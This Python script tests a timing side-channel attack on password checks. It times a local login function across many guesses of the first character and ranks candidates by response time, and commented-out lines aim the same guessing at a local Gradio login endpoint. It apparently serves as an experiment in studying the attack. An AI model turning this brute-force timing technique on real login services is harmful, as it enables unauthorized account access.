import string
import requests
from requests.auth import HTTPBasicAuth
from time import time_ns,time
from pprint import pprint
import json

# Gradio server URL
BASE_URL = "http://127.0.0.1:7860"
# API_URL = "http://127.0.0.1:8000/login"

def login(username,password):
    users = {
        'admin':'e'*1000
    }
    if username in users and users[username] == password:
        # print("Login successful!")
        return True
    else:
        # print("Invalid username or password.")
        return False


# Start a session (mimics a browser)
start = time()
session = requests.Session()
end = time()
print(f"session time : {end-start}\n")
# Join the queue (this is what `/queue/join` was handling internally)
# queue_url = f"{BASE_URL}/queue/status"
# 
# start = time()
# response = session.get(queue_url)
# end = time()
# print(f"queue_url : {end-start}\n")
# # print("Queue Response:", response.json())
# 
# # Send login request
# login_url = f"{BASE_URL}/api/login"
# payload = {"data": ["admin", "password1223"]}
# login_response = session.post(login_url, json=payload)

# print("Login Response:", login_response.json()['data'][0])

supposed_username = "admin"
supposed_password_length = 1000

# symbols_results = {key: 0 for key in string.printable}
symbols = string.ascii_letters + string.digits
symbols_results = {key: [0, 0] for key in symbols}

N = 10000000
normal_time = 4492242
for_start = time()
for _ in range(N):
    for letter in symbols:
        attempt_string = letter + (supposed_password_length-1)*'e'

        # payload = {"data": ["admin", f"{attempt_string}"]}
        # login_response = session.post(login_url, json=payload)

        # login_response = requests.post(API_URL, data={"username": f"{supposed_username}", "password": f"{attempt_string}"})
        # login_response = session.get(BASE_URL, auth=HTTPBasicAuth(supposed_username, attempt_string))
        start = time_ns()
        login_response = login(supposed_username, attempt_string)
        end = time_ns()
        aux = end - start

        if(aux / normal_time <= 1.3):
            symbols_results[letter][0] += end - start
            symbols_results[letter][1] += 1
for_end = time()
print(f"total for time(s) : {for_end-for_start} for N = {N}\n")

# print(symbols_results)

with open("results_dict.txt", "a") as file:
    sorted_dict = dict(sorted(symbols_results.items(), key=lambda item: item[1][0]/item[1][1], reverse=True))
    json.dump(sorted_dict,file)
    file.write('\n')


print(sorted_dict)
# pprint(sorted(symbols_results, reverse=True))

# key=symbols_results.get
# pprint(symbols_results)

# Print response
# if response.status_code == 200:
    # print("Login successful!")
    # print("Response:", response.json())
# else:
    # print("Login failed!")
    # print("Error:", response.text)